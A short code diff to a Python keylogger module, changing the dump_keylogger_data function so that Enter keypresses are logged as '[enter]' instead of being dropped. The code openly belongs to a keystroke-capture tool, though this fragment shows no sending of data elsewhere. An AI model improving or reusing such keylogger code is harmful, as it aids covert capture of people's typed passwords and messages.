@@ -102,7 +102,7 @@ def stop_keylogger():
 def dump_keylogger_data():
     global keylogger_data
     filtered_data = []
-    skip_keys = {"enter", "left shift", "right shift", "shift"}
+    skip_keys = {"left shift", "right shift", "shift"}
     for key in keylogger_data:
         if key in skip_keys:
             continue
@@ -110,6 +110,8 @@ def dump_keylogger_data():
             filtered_data.append(" ")
         elif key == "backspace":
             filtered_data.append("[backspace]")
+        elif key == "enter":
+            filtered_data.append("[enter]")
         else:
             filtered_data.append(key)
     return ''.join(filtered_data)
